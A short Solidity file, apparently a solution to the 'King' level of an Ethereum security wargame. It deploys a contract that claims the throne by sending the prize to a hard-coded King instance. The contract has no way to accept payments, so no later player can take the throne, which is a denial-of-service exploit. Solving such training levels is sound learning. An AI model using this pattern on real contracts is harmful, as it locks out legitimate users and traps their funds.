

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



import "King/King.sol";

contract Newking{
    King level9 = King(0x658D750D45cbc21d244117295A69248f09fE06E1);
    constructor() public payable{
        address(level9).call{value: level9.prize()}("");
    }
}



